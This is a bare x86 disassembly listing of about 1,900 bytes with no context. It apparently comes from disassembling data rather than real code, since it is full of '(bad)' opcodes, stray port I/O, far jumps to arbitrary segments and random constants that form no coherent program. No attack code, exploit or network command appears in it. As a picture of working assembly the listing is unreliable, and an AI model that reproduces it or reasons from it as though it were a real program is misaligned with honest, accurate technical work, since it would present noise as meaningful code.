  431fbb:	bound  eax,QWORD PTR [ebp+0x315f9d06]
  431fc1:	cli    
  431fc2:	stos   BYTE PTR es:[edi],al
  431fc3:	push   ebp
  431fc4:	mov    edi,0xaa6b364d
  431fc9:	add    ah,BYTE PTR [esi-0x25]
  431fcc:	sub    eax,DWORD PTR [ebx]
  431fce:	add    BYTE PTR [eax],al
  431fd0:	add    BYTE PTR [eax],al
  431fd2:	add    BYTE PTR [ebx+ebx*1-0x2],dh
  431fd6:	push   ecx
  431fd7:	and    ah,BYTE PTR [edi+esi*4-0x24caf0f9]
  431fde:	xchg   BYTE PTR [esi-0x4179a015],al
  431fe4:	adc    eax,0xd96aac26
  431fe9:	xor    DWORD PTR [esi+0x418b31e8],eax
  431fef:	jno    0x431fa5
  431ff1:	lds    eax,FWORD PTR [edi]
  431ff3:	pop    ebp
  431ff4:	mov    cl,0x31
  431ff6:	cli    
  431ff7:	dec    edx
  431ff8:	mov    ds:0xe87207bc,eax
  431ffd:	lds    ecx,FWORD PTR [ebx]
  431fff:	out    dx,al
  432000:	or     al,BYTE PTR [ebp+eiz*8+0x7d]
  432004:	fisub  DWORD PTR [ebx]
  432006:	pop    es
  432007:	in     eax,dx
  432008:	sbb    ch,bh
  43200a:	push   DWORD PTR [ebp-0x4]
  43200d:	push   ebx
  43200e:	push   es
  43200f:	inc    esp
  432010:	rol    BYTE PTR [esi+0x6b208151],0x46
  432017:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  432019:	dec    esi
  43201a:	ror    BYTE PTR [edi],0x32
  43201d:	(bad)  
  43201f:	xor    al,0x3b
  432021:	or     eax,DWORD PTR [edi]
  432023:	les    esi,FWORD PTR [edi+0x48855186]
  432029:	imul   eax,DWORD PTR [esi-0x79],0x2
  43202d:	outs   dx,BYTE PTR ds:[esi]
  43202e:	push   ebx
  43202f:	mov    ch,0x1c
  432031:	lock loopne 0x431ff6
  432034:	inc    ecx
  432035:	xchg   DWORD PTR [eax+eax*1],ecx
  432038:	add    BYTE PTR [eax],al
  43203a:	add    BYTE PTR [eax],al
  43203c:	jb     0x43208f
  43203e:	add    cl,BYTE PTR [ebx+0x6cf21424]
  432044:	xor    ecx,DWORD PTR [esi]
  432046:	outs   dx,BYTE PTR ds:[esi]
  432047:	push   ebx
  432048:	mov    ch,0x1c
  43204a:	loopne 0x43202c
  43204c:	mov    edx,0x7a0c8741
  432051:	push   ecx
  432052:	retf   0x448a
  432055:	push   cs
  432056:	jmp    0xb553:0x5e103b6c
  43205d:	sbb    al,0xe0
  43205f:	loopne 0x432013
  432061:	inc    ecx
  432062:	inc    edi
  432063:	or     al,0x72
  432065:	push   ecx
  432066:	ret    0xc48a
  432069:	adc    dl,ah
  43206b:	ins    BYTE PTR es:[edi],dx
  43206c:	mov    bl,0xa
  43206e:	pop    esi
  43206f:	push   ebx
  432070:	xor    eax,0x2ae0f01c
  432075:	inc    ecx
  432076:	pop    es
  432077:	or     al,0x7a
  432079:	push   ecx
  43207a:	mov    cl,BYTE PTR [edx+0x6cda0aa4]
  432080:	mov    ebx,0x35536e0c
  432085:	sbb    al,0xf0
  432087:	loopne 0x4320cb
  432089:	inc    ecx
  43208a:	pop    es
  43208b:	or     al,0x72
  43208d:	push   ecx
  43208e:	or     BYTE PTR [edx+0x6cf20cc4],0xb3
  432095:	push   es
  432096:	outs   dx,BYTE PTR ds:[esi]
  432097:	(bad)  
  432098:	jle    0x432115
  43209a:	mov    bh,0x42
  43209c:	adc    dl,bh
  43209e:	add    eax,0x54
  4320a3:	add    BYTE PTR [eax],al
  4320a5:	xor    eax,0x2408f021
  4320aa:	mov    al,ds:0x7d8ecd6f
  4320af:	call   DWORD PTR [ecx+0x2c86dc1a]
  4320b5:	mov    DWORD PTR [eax+0x17ec4006],esp
  4320bb:	out    dx,al
  4320bc:	inc    esp
  4320bd:	std    
  4320be:	jmp    edi
  4320c0:	mov    dh,0x80
  4320c2:	sub    al,0xfa
  4320c4:	bound  edx,QWORD PTR [ebx]
  4320c6:	test   DWORD PTR [eax+0x3bfedef],0xfa294491
  4320d0:	jbe    0x4320d1
  4320d2:	rol    BYTE PTR [ebx],0x62
  4320d5:	lods   eax,DWORD PTR ds:[esi]
  4320d6:	fsubrp st(7),st
  4320d8:	cs pusha 
  4320da:	sub    al,0xfa
  4320dc:	jo     0x4320ae
  4320de:	fiadd  WORD PTR [esi-0x79348124]
  4320e4:	daa    
  4320e5:	test   al,0xcf
  4320e7:	pop    esp
  4320e8:	sub    esi,DWORD PTR [edx+0x2]
  4320eb:	push   ebp
  4320ec:	jb     0x432088
  4320ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4320ef:	jmp    0x4320c2
  4320f1:	inc    ebp
  4320f2:	aad    0xd6
  4320f4:	xchg   edi,eax
  4320f5:	inc    ebp
  4320f6:	mov    ch,0x4e
  4320f8:	jb     0x432093
  4320fa:	jp     0x432156
  4320fc:	leave  
  4320fd:	dec    eax
  4320ff:	and    esp,DWORD PTR [eax+0x21]
  432102:	fsubrp st(7),st
  432104:	xchg   esi,eax
  432105:	xchg   ebx,eax
  432106:	sub    dl,bh
  432108:	ins    DWORD PTR es:[edi],dx
  432109:	add    BYTE PTR [eax],al
  43210b:	add    BYTE PTR [eax],al
  43210d:	add    BYTE PTR [esi+0x764183f8],dh
  432113:	add    al,BYTE PTR [eax]
  432115:	sahf   
  432116:	repz scas al,BYTE PTR es:[edi]
  432118:	out    0x1,eax
  43211a:	push   ecx
  43211b:	xor    edx,edi
  43211d:	out    0xed,al
  43211f:	or     ah,BYTE PTR gs:[ebp-0x62]
  432123:	and    eax,0xc689e9fa
  432128:	out    dx,eax
  432129:	pusha  
  43212a:	and    al,0x32
  43212c:	out    0x0,al
  43212e:	push   cs
  43212f:	sub    eax,0x82d96ad1
  432134:	inc    ebx
  432135:	clc    
  432136:	mov    WORD PTR [ecx-0x1e],cs
  432139:	addr16 sub edx,esi
  43213c:	cmc    
  43213d:	cmp    ecx,DWORD PTR [edi]
  43213f:	add    al,BYTE PTR [ebp+eax*4-0x7cfffe24]
  432146:	in     al,0xfb
  432148:	je     0x4321ac
  43214a:	push   edi
  43214b:	cmp    esi,edx
  43214d:	xor    ecx,DWORD PTR [ebx-0x6bb07e0a]
  432153:	xor    DWORD PTR [ebx-0x4],ecx
  432156:	out    dx,eax
  432157:	jmp    0x4320da
  432159:	fmul   DWORD PTR [edi-0x367615ae]
  43215f:	(bad)  [ecx]
  432161:	jne    0x43218b
  432163:	jge    0x43211e
  432165:	add    eax,0x3afac81f
  43216a:	test   eax,0xbe3c6e05
  43216f:	cli    
  432170:	xor    bl,BYTE PTR [ebp+0x0]
  432173:	add    BYTE PTR [eax],al
  432175:	add    BYTE PTR [eax],al
  432177:	les    ebp,FWORD PTR [ecx+0x33]
  43217a:	cmp    eax,0xa0015c
  43217f:	sub    esp,DWORD PTR [ebx]
  432181:	add    BYTE PTR fs:[edx],bl
  432184:	dec    esp
  432185:	add    edi,0xffeef064
  43218b:	arpl   WORD PTR [edx-0x46],di
  43218e:	je     0x43219f
  432190:	jl     0x4321cf
  432192:	and    BYTE PTR [ebp-0x5a],cl
  432195:	pop    ebx
  432196:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432198:	imul   ebp,esi,0xffffff83
  43219b:	or     ebx,DWORD PTR ds:0xd4d9f5fa
  4321a1:	push   DWORD PTR [esp+ebx*4+0x7c]
  4321a5:	jnp    0x43219f
  4321a7:	sbb    al,0x6b
  4321a9:	test   bh,bh
  4321ab:	jne    0x432181
  4321ad:	(bad)  
  4321af:	clc    
  4321b0:	pop    es
  4321b1:	dec    ebx
  4321b2:	dec    esi
  4321b3:	cli    
  4321b4:	in     eax,0x37
  4321b6:	xchg   BYTE PTR [edx-0x2210489d],bh
  4321bc:	pop    edi
  4321bd:	xor    bh,dl
  4321bf:	loop   0x43215f
  4321c1:	ds jae 0x432149
  4321c4:	pop    esp
  4321c5:	cmc    
  4321c6:	cli    
  4321c7:	push   0x75401393
  4321cc:	xchg   esi,eax
  4321cd:	ds jae 0x432249
  4321d0:	retf   
  4321d1:	add    esp,edi
  4321d3:	ja     0x43223e
  4321d5:	ds pop ecx
  4321d7:	dec    esi
  4321d8:	jb     0x43221b
  4321da:	push   eax
  4321db:	add    BYTE PTR [eax],al
  4321dd:	add    BYTE PTR [eax],al
  4321df:	add    BYTE PTR [ebx+0x4],al
  4321e2:	call   0x9afc:0x5c648d2f
  4321e9:	xchg   ebp,eax
  4321ea:	ds jae 0x432260
  4321ed:	mov    al,0xba
  4321ef:	and    esp,DWORD PTR [ecx-0x68]
  4321f2:	idiv   dl
  4321f4:	mul    BYTE PTR [edx-0xa]
  4321f7:	cli    
  4321f8:	div    BYTE PTR [edx-0x6]
  4321fb:	cli    
  4321fc:	idiv   BYTE PTR [ecx]
  4321fe:	push   cs
  4321ff:	add    dh,dh
  432201:	cmp    DWORD PTR [edx],edx
  432203:	add    ah,ch
  432205:	popa   
  432206:	push   es
  432207:	xchg   DWORD PTR [ebp+0x11],esp
  43220a:	add    eax,0x389f4b2f
  43220f:	je     0x432282
  432211:	dec    eax
  432212:	ds out 0x5f,al
  432215:	mov    al,ds:0xb06523c2
  43221a:	xor    BYTE PTR [eax-0x6b2ee85],cl
  432220:	sub    ch,BYTE PTR ds:0x1ca8bf81
  432226:	push   ss
  432227:	dec    ebx
  432228:	mov    es,WORD PTR [edx]
  43222a:	loop   0x43225d
  43222c:	sbb    ebx,DWORD PTR [edi]
  43222e:	ins    DWORD PTR es:[edi],dx
  43222f:	dec    edx
  432230:	scas   eax,DWORD PTR es:[edi]
  432231:	les    ebp,FWORD PTR [edi]
  432233:	inc    esi
  432234:	jp     0x432238
  432236:	xor    al,0x7d
  432238:	push   cs
  432239:	adc    ah,0xc
  43223c:	inc    edx
  43223d:	int3   
  43223e:	imul   eax,edi,0x7e
  432241:	shl    BYTE PTR [ecx+0xb7],cl
  432247:	add    BYTE PTR [eax],al
  432249:	outs   dx,BYTE PTR ds:[esi]
  43224a:	out    dx,eax
  43224b:	(bad)  
  43224c:	aad    0xdf
  43224e:	lods   eax,DWORD PTR ds:[esi]
  43224f:	lock sbb ebx,DWORD PTR [edx-0x3fc1704]
  432256:	mov    ebp,0xf403ece0
  43225b:	fs addr16 mov edx,0xb09de823
  432262:	rcl    BYTE PTR ds:0xbd1ab77d,1
  432268:	aaa    
  432269:	lahf   
  43226a:	and    esp,DWORD PTR [esp+eax*2+0x6f]
  43226e:	jle    0x4322de
  432270:	add    al,0x75
  432272:	add    dh,BYTE PTR [edx+0x401a017e]
  432278:	dec    esp
  432279:	xchg   ebx,eax
  43227a:	and    ecx,DWORD PTR [ecx-0x78]
  43227d:	mov    edx,0xb77cc3ae
  432282:	or     dh,dh
  432284:	(bad)  
  432285:	jb     0x4322fe
  432287:	sti    
  432288:	mov    bh,0x70
  43228a:	ret    0x7ae8
  43228d:	mov    cl,0x2e
  43228f:	outs   dx,BYTE PTR ds:[esi]
  432290:	leave  
  432291:	push   0xffffffcf
  432293:	jo     0x43225c
  432295:	inc    edx
  432296:	jne    0x432243
  432298:	das    
  432299:	mov    dl,0x98
  43229b:	jecxz  0x43231b
  43229d:	mov    cl,0x2e
  43229f:	cwde   
  4322a0:	xor    BYTE PTR [edi+0x23],ah
  4322a3:	adc    al,BYTE PTR [edi-0x4a005216]
  4322a9:	stc    
  4322aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4322ab:	sti    
  4322ac:	in     al,0x0
  4322ae:	add    BYTE PTR [eax],al
  4322b0:	add    BYTE PTR [eax],al
  4322b2:	jecxz  0x43229d
  4322b4:	dec    esi
  4322b5:	je     0x4322f2
  4322b7:	daa    
  4322b8:	dec    edi
  4322b9:	faddp  st(3),st
  4322bb:	cli    
  4322bc:	cli    
  4322bd:	pop    esp
  4322be:	jne    0x4322e7
  4322c0:	xor    cl,dh
  4322c2:	pushf  
  4322c3:	jle    0x432284
  4322c5:	cmp    eax,0xf1447bdf
  4322ca:	fistp  QWORD PTR [ebp-0x5c78c305]
  4322d0:	inc    edx
  4322d1:	or     DWORD PTR [esi+0x27],esi
  4322d4:	xor    bh,al
  4322d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4322d7:	fdivp  st(2),st
  4322d9:	es test eax,0x6b051427
  4322df:	ret    0x8dff
  4322e2:	add    esi,edi
  4322e4:	out    0x23,eax
  4322e6:	dec    esi
  4322e7:	es cli 
  4322e9:	cmp    DWORD PTR [edi+0x1b],esi
  4322ec:	pop    ds
  4322ed:	sbb    ah,BYTE PTR [esi+ebp*4-0x15]
  4322f1:	bound  ebp,QWORD PTR ds:0x6e517428
  4322f7:	(bad)  
  4322f8:	out    dx,al
  4322f9:	pop    esi
  4322fa:	inc    ebp
  4322fb:	sub    BYTE PTR [edx],dh
  4322fd:	push   esi
  4322fe:	imul   ebx,DWORD PTR [edx],0x10
  432301:	test   eax,0xf5742776
  432306:	mov    ds,ecx
  432308:	test   al,0x3c
  43230a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43230b:	out    dx,eax
  43230c:	mov    edi,0xbd4b3197
  432311:	loope  0x432389
  432313:	mov    bh,0x86
  432315:	adc    eax,0x0
  43231a:	add    cl,bh
  43231c:	sub    eax,0xbbc9ba0f
  432321:	adc    edi,DWORD PTR [esi+0x20f9bc1]
  432327:	dec    eax
  432328:	test   al,0x4
  43232a:	add    BYTE PTR [ecx+0x250f248],ch
  432330:	inc    BYTE PTR [esi+0x79f22bf3]
  432336:	clc    
  432337:	adc    DWORD PTR [ecx+0x32],ebx
  43233a:	mov    esp,DWORD PTR [ecx-0x12]
  43233d:	sub    DWORD PTR [esi+0x74],eax
  432340:	pushf  
  432341:	dec    ebx
  432342:	cld    
  432343:	pop    esi
  432344:	pusha  
  432345:	adc    cl,BYTE PTR [ebp+0x7d890b3c]
  43234b:	sub    al,0x6
  43234d:	repnz mov DWORD PTR [ecx-0x332c8626],ecx
  432354:	sahf   
  432355:	inc    ebx
  432356:	clc    
  432357:	push   esp
  432358:	inc    ebx
  432359:	div    dh
  43235b:	sbb    eax,0x51047508
  432360:	(bad)  
  432361:	jae    0x432378
  432363:	jbe    0x43236b
  432365:	dec    ebx
  432366:	push   edi
  432367:	push   edi
  432368:	enter  0x34e2,0x2f
  43236c:	icebp  
  43236d:	cmc    
  43236e:	test   ah,bl
  432370:	pop    ebx
  432371:	lods   eax,DWORD PTR ds:[esi]
  432372:	xor    cl,ah
  432374:	push   ecx
  432375:	push   ecx
  432376:	leave  
  432377:	iret   
  432378:	popf   
  432379:	inc    ebx
  43237a:	lock add eax,0x8b0248
  432380:	add    BYTE PTR [eax],al
  432382:	add    BYTE PTR [eax],al
  432384:	rcr    ecx,1
  432386:	xchg   DWORD PTR [esi-0x68],eax
  432389:	sahf   
  43238a:	js     0x43239c
  43238c:	adc    eax,0x5db00e50
  432391:	cld    
  432392:	loopne 0x4323e5
  432394:	out    0x49,eax
  432396:	add    cl,BYTE PTR [ebx-0x2f7edee5]
  43239c:	outs   dx,DWORD PTR ds:[esi]
  43239d:	mov    bh,0x49
  43239f:	push   esi
  4323a0:	fucomip st,st(4)
  4323a2:	cmc    
  4323a3:	je     0x43238b
  4323a5:	cmp    DWORD PTR [edx-0x17a8afb],0x7e
  4323ac:	and    al,0x2b
  4323ae:	ror    DWORD PTR [edi-0x2],cl
  4323b1:	out    dx,eax
  4323b2:	sbb    esi,eax
  4323b4:	daa    
  4323b5:	and    BYTE PTR [ecx],ch
  4323b7:	xor    DWORD PTR ds:0xa286d79f,0x3b
  4323be:	aad    0x72
  4323c0:	jge    0x43236e
  4323c2:	sbb    al,0x4
  4323c4:	mov    ds:0xa7a733,eax
  4323c9:	cmp    BYTE PTR [ebp-0x29],dh
  4323cc:	lock push ebx
  4323ce:	mov    dl,0x3f
  4323d0:	clc    
  4323d1:	pusha  
  4323d2:	stos   DWORD PTR es:[edi],eax
  4323d3:	or     al,0x5f
  4323d5:	clc    
  4323d6:	sub    dl,BYTE PTR [ecx+edi*8]
  4323d9:	cmp    al,0xbe
  4323db:	push   edi
  4323dd:	bound  ebp,QWORD PTR [ecx]
  4323df:	out    0x7d,al
  4323e1:	loope  0x4323b1
  4323e3:	push   edx
  4323e4:	frstor [eax+0x30]
  4323e7:	cli    
  4323e8:	add    BYTE PTR [eax],al
  4323ea:	add    BYTE PTR [eax],al
  4323ec:	add    dl,al
  4323ee:	xor    eax,DWORD PTR [esp+esi*2+0x58]
  4323f2:	add    eax,0x4f29fb05
  4323f7:	push   es
  4323f8:	xchg   DWORD PTR [ebx-0x5018ca6d],esi
  4323fe:	xor    dh,bh
  432400:	(bad)  
  432401:	out    dx,al
  432402:	(bad)  
  432403:	out    0xf,eax
  432405:	cld    
  432406:	sub    DWORD PTR [edi+0x6e2701bf],eax
  43240c:	add    BYTE PTR [esi+0x3ae7cd22],cl
  432412:	sub    DWORD PTR [edi],0xfffffffa
  432415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432416:	jmp    0xec0f7ae7
  43241b:	idiv   bh
  43241d:	leave  
  43241e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43241f:	sbb    al,BYTE PTR [esi-0x1482de50]
  432425:	add    dh,BYTE PTR gs:[esi-0x39f15686]
  43242c:	inc    edx
  43242d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43242e:	adc    DWORD PTR [eax],0x2e
  432431:	outs   dx,DWORD PTR ds:[esi]
  432432:	xchg   BYTE PTR [edi+0x3],bl
  432435:	jne    0x432439
  432437:	call   0x252e:0x1012a180
  43243e:	and    cl,dh
  432440:	xchg   dl,bl
  432442:	xchg   esi,eax
  432443:	ins    BYTE PTR es:[edi],dx
  432444:	jmp    0xa98:0xb55916b1
  43244b:	outs   dx,BYTE PTR ds:[esi]
  43244c:	(bad)  
  43244d:	jp     0x43242a
  43244f:	sub    esi,DWORD PTR [eax+eax*1]
  432452:	add    BYTE PTR [eax],al
  432454:	add    BYTE PTR [eax],al
  432456:	mov    ebp,DWORD PTR [ebp+0x2e2a765]
  43245c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  43245e:	out    0x2,al
  432460:	dec    edi
  432461:	add    al,0xde
  432463:	xchg   ebp,eax
  432464:	mov    esp,0x331fb779
  432469:	xor    al,0xda
  43246b:	(bad)  
  43246c:	xchg   esi,eax
  43246d:	sub    eax,0xb8a886cf
  432472:	xor    BYTE PTR [ebx+ebp*8+0x381a317e],ch
  432479:	aad    0x9a
  43247b:	mov    bl,0x76
  43247d:	sub    eax,0x78083af
  432482:	sub    cl,al
  432484:	pop    ebp
  432485:	mov    bh,0xa2
  432487:	shl    ecx,cl
  432489:	or     edi,ebx
  43248b:	mov    DWORD PTR [eax],0x6d1e31f4
  432491:	xlat   BYTE PTR ds:[ebx]
  432492:	jp     0x432467
  432494:	sub    BYTE PTR [ecx-0x54],bh
  432497:	add    ebx,DWORD PTR [ebx+esi*1+0x114094fd]
  43249e:	mov    al,0x16
  4324a0:	gs inc ebx
  4324a2:	jns    0x432427
  4324a4:	call   FWORD PTR [eax]
  4324a6:	jno    0x432481
  4324a8:	push   esp
  4324a9:	cmp    DWORD PTR [edx],ecx
  4324ab:	pop    es
  4324ac:	xchg   DWORD PTR [edx+eax*4+0xaed54d8],edi
  4324b3:	cmc    
  4324b4:	mov    BYTE PTR [esi+eax*4+0x15448a],ah
  4324bb:	add    BYTE PTR [eax],al
  4324bd:	add    BYTE PTR [eax],al
  4324bf:	sbb    al,0xc6
  4324c1:	or     edi,DWORD PTR [esi+0x71]
  4324c4:	mov    al,0x9f
  4324c6:	ret    0x6e3
  4324c9:	jb     0x43251d
  4324cb:	daa    
  4324cc:	pop    edi
  4324cd:	pop    ecx
  4324ce:	xchg   edx,eax
  4324cf:	dec    edi
  4324d0:	pop    ebp
  4324d1:	pop    es
  4324d2:	jmp    0xe93eeb17
  4324d7:	retf   
  4324d8:	sub    al,0x84
  4324da:	ffreep st(2)
  4324dc:	sub    BYTE PTR [esi+0x428aa954],al
  4324e2:	(bad)  [edi-0x6c]
  4324e5:	pop    es
  4324e6:	jo     0x4324b1
  4324e8:	or     cl,BYTE PTR [ecx+0x528126]
  4324ee:	ret    0xb643
  4324f1:	xchg   BYTE PTR [ebp+0x7207c14d],dl
  4324f7:	add    BYTE PTR [ebx],cl
  4324f9:	xchg   DWORD PTR [ecx+0x7d7e31d5],edi
  4324ff:	xchg   BYTE PTR [edi-0x6c1d790b],bl
  432505:	gs jmp 0xafc9f3d2
  43250b:	jle    0x432577
  43250d:	lock outs dx,BYTE PTR ds:[esi]
  43250f:	popa   
  432510:	cmp    DWORD PTR [edi+0x4a4eedd],0x6c
  432517:	mov    ebx,0x5ebf4f12
  43251c:	push   edi
  43251d:	lock dec esi
  43251f:	mov    eax,ds:0xf79c
  432524:	add    BYTE PTR [eax],al
  432526:	add    BYTE PTR [eax],al
  432528:	pop    ecx
  432529:	push   ebp
  43252a:	dec    ebp
  43252b:	mov    edx,DWORD PTR [edx]
  43252d:	or     dh,BYTE PTR [ecx]
  43252f:	dec    ebp
  432530:	cwde   
  432531:	adc    BYTE PTR [ebx-0xc],cl
  432534:	(bad)  
  432535:	mov    al,0x84
  432537:	shr    DWORD PTR [esi],0x45
  43253a:	repnz push 0x4c
  43253d:	out    dx,eax
  43253e:	jo     0x43254c
  432540:	push   eax
  432541:	add    edi,esi
  432543:	jbe    0x432559
  432545:	adc    al,0xbc
  432547:	mov    cl,bl
  432549:	jmp    0x7fc7ebcf
  43254e:	out    dx,eax
  43254f:	jmp    DWORD PTR [ebx]
  432551:	test   DWORD PTR [edx-0x5842e8c],edi
  432557:	mov    WORD PTR [ecx-0x16],ds
  43255a:	dec    edx
  43255b:	push   0x19
  43255d:	fwait
  43255e:	inc    ebx
  43255f:	hlt    
  432560:	cmp    al,0xe9
  432562:	xor    bh,bh
  432564:	jmp    0xdc8331d6
  432569:	cmp    BYTE PTR [edx+0x7b84c974],0xfc
  432570:	leave  
  432571:	push   edx
  432572:	add    eax,0x48e8caff
  432577:	sub    BYTE PTR [ebx],dl
  432579:	hlt    
  43257a:	imul   edx,DWORD PTR [edx],0xffffff8c
  43257d:	push   es
  43257e:	mov    al,0x1
  432580:	adc    eax,0xd5c02cc6
  432585:	lds    edx,FWORD PTR [eax-0x75]
  432588:	test   al,0x3d
  43258a:	add    cl,BYTE PTR [ebx+0x0]
  432590:	add    BYTE PTR [edx+0x23ce8130],bl
  432596:	inc    BYTE PTR ss:[esp+ebx*8+0x43830353]
  43259e:	jmp    0x7e93484
  4325a3:	push   eax
  4325a4:	call   0xf9eb8a1e
  4325a9:	jb     0x43254b
  4325ab:	sub    eax,DWORD PTR [edx+ebp*2-0x917f1a1]
  4325b2:	pop    ebx
  4325b3:	sub    dl,bh
  4325b5:	icebp  
  4325b6:	jmp    0xc979:0x24fe02af
  4325bd:	dec    edx
  4325be:	pop    ebx
  4325bf:	idiv   BYTE PTR [esi+0x42]
  4325c2:	cld    
  4325c3:	scas   eax,DWORD PTR es:[edi]
  4325c4:	add    eax,0x1aff3f0
  4325c9:	retf   0x6e03
  4325cc:	stos   BYTE PTR es:[edi],al
  4325cd:	sub    BYTE PTR [ebx+edi*2],al
  4325d0:	add    DWORD PTR [edi+0x1ac9792a],ecx
  4325d6:	cmp    eax,ebp
  4325d8:	cs xor eax,0x7503448d
  4325de:	fidivr WORD PTR [edx-0x15]
  4325e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4325e2:	aam    0x7a
  4325e4:	div    eax
  4325e6:	cmp    al,0xaf
  4325e8:	add    esp,DWORD PTR [edi-0xfc4e695]
  4325ee:	inc    ebx
  4325ef:	stos   BYTE PTR es:[edi],al
  4325f0:	adc    ecx,DWORD PTR [edi+0x2b]
  4325f3:	shl    BYTE PTR [edi+0x0],1
  4325f6:	add    BYTE PTR [eax],al
  4325f8:	add    BYTE PTR [eax],al
  4325fa:	xor    ebx,DWORD PTR [edi-0x3c]
  4325fd:	call   FWORD PTR [ebx+ebp*1+0x16]
  432601:	cdq    
  432602:	adc    al,0x66
  432604:	and    eax,0x197c3887
  432609:	push   cs
  43260a:	and    eax,DWORD PTR [ebx]
  43260c:	mov    esi,0x9c2b37f3
  432611:	call   DWORD PTR [edx-0x5d06e5d3]
  432617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432618:	or     al,BYTE PTR ds:[eax]
  43261b:	out    dx,al
  43261c:	es jg  0x43262f
  43261f:	lods   al,BYTE PTR ds:[esi]
  432620:	(bad)  
  432621:	je     0x4326a0
  432623:	add    ch,BYTE PTR [esi+0x1]
  432626:	sbb    eax,DWORD PTR [ebx]
  432628:	outs   dx,BYTE PTR ds:[esi]
  432629:	cmp    DWORD PTR [edi-0xf],edi
  43262c:	pop    esi
  43262d:	shr    BYTE PTR [edi-0x44],0x1f
  432631:	inc    esi
  432632:	icebp  
  432633:	adc    al,0xbb
  432635:	push   es
  432636:	xchg   edx,eax
  432637:	inc    edx
  432638:	and    eax,0xbf02d0d2
  43263d:	add    esp,DWORD PTR [edi-0x77d05d56]
  432643:	add    cl,BYTE PTR [edi+0x1a02db03]
  432649:	adc    BYTE PTR [ebp-0xf],al
  43264c:	test   al,0x3
  43264e:	cli    
  43264f:	sbb    ah,BYTE PTR [ebx+0x2a]
  432652:	mov    eax,ds:0x9b016e0a
  432657:	add    DWORD PTR [esi+0x39],ebp
  43265a:	pop    ds
  43265b:	repz pop ebp
  43265d:	inc    edx
  43265e:	add    BYTE PTR [eax],al
  432660:	add    BYTE PTR [eax],al
  432662:	add    BYTE PTR [edi+0x1e7e933f],ch
  432668:	adc    ah,0xf8
  43266b:	jne    0x43266f
  43266d:	jmp    0xe1561a43
  432672:	jo     0x4326ad
  432674:	push   cs
  432675:	pop    esi
  432676:	cmp    dh,BYTE PTR [ebp-0x4a0327df]
  43267c:	xchg   DWORD PTR [ebx],ebp
  43267e:	cld    
  43267f:	repz or DWORD PTR [eax-0x41],esp
  432683:	jle    0x43260c
  432685:	pop    ds
  432686:	or     BYTE PTR [ecx+eiz*1-0x764a0310],dh
  43268d:	and    edi,eax
  43268f:	jmp    0xf9be0b59
  432694:	push   ds
  432695:	mov    ch,BYTE PTR [ecx]
  432697:	scas   eax,DWORD PTR es:[edi]
  432698:	lea    ebp,[ebx+0x2c]
  43269b:	pushf  
  43269c:	sbb    edi,DWORD PTR [ecx+0x41]
  43269f:	icebp  
  4326a0:	sbb    bh,bh
  4326a2:	jbe    0x432700
  4326a4:	sbb    BYTE PTR [eax],al
  4326a6:	jmp    0x6d062921
  4326ab:	jns    0x4326c4
  4326ad:	cli    
  4326ae:	pop    esi
  4326af:	jne    0x4326b3
  4326b1:	add    cl,ch
  4326b3:	mov    ds,WORD PTR [edi-0x4663b172]
  4326b9:	enter  0x612b,0x1b
  4326bd:	push   ebx
  4326be:	jb     0x43273d
  4326c0:	pushf  
  4326c1:	jecxz  0x4326f4
  4326c3:	es pushf 
  4326c5:	jl     0x4326a4
  4326c7:	add    BYTE PTR [eax],al
  4326c9:	add    BYTE PTR [eax],al
  4326cb:	add    BYTE PTR [esi-0x35],dh
  4326ce:	push   ecx
  4326cf:	mov    esi,0xbc86a612
  4326d4:	push   0xffffff81
  4326d6:	imul   BYTE PTR [ecx]
  4326d8:	pop    esp
  4326d9:	js     0x4326da
  4326db:	xchg   ebp,eax
  4326dc:	cmp    BYTE PTR [esp+edi*2-0x78ff5e0f],al
  4326e3:	test   eax,0xd14b8d6a
  4326e8:	xor    dx,0x1
  4326ec:	dec    eax
  4326ed:	pop    edi
  4326ee:	cld    
  4326ef:	out    0x82,al
  4326f1:	pop    ebx
  4326f2:	jae    0x43271e
  4326f4:	js     0x4326f6
  4326f6:	xchg   DWORD PTR [ecx-0x7b],ebx
  4326f9:	sbb    ebp,edx
  4326fb:	pusha  
  4326fc:	mov    esp,0x12a28502
  432701:	lock cli 
  432703:	xor    al,0xdd
  432705:	cmp    DWORD PTR [esi+0x530abb62],0x5c
  43270c:	sbb    al,0xb
  43270e:	call   0xfa5bb354
  432713:	jb     0x4326c8
  432715:	out    dx,al
  432716:	xchg   BYTE PTR [ecx+esi*4],dl
  432719:	add    DWORD PTR [ebp+ebx*8+0x29],0xffffffc9
  43271e:	pop    es
  43271f:	add    BYTE PTR ds:0x9046bf01,ah
  432725:	(bad)  
  432726:	inc    DWORD PTR [ecx]
  432728:	pushf  
  432729:	xchg   edi,eax
  43272a:	pop    eax
  43272b:	or     al,0x17
  43272d:	add    bh,BYTE PTR [ebx-0x3f]
  432730:	add    BYTE PTR [eax],al
  432732:	add    BYTE PTR [eax],al
  432734:	add    BYTE PTR [edi+edi*8+0x47],bh
  432738:	adc    al,0xdc
  43273a:	jmp    edx
  43273c:	add    cl,BYTE PTR [esi+0x275e55be]
  432742:	xchg   edi,eax
  432743:	jecxz  0x4327a2
  432745:	mov    ?,ebp
  432747:	call   DWORD PTR [edi+eiz*8-0xf]
  43274b:	jns    0x432739
  43274d:	pop    eax
  43274e:	das    
  43274f:	cmc    
  432750:	jne    0x43277e
  432752:	xchg   ecx,eax
  432753:	inc    ebx
  432754:	hlt    
  432755:	pop    ds
  432756:	(bad)  
  432757:	dec    edx
  432758:	mov    ecx,edi
  43275a:	jmp    0xfdcb84e6
  43275f:	adc    BYTE PTR [ebx+edi*2],0xea
  432763:	jle    0x432725
  432765:	mov    eax,ds:0x2075f51a
  43276a:	std    
  43276b:	push   cs
  43276c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43276d:	or     edx,esp
  43276f:	test   bl,al
  432771:	out    0xdc,eax
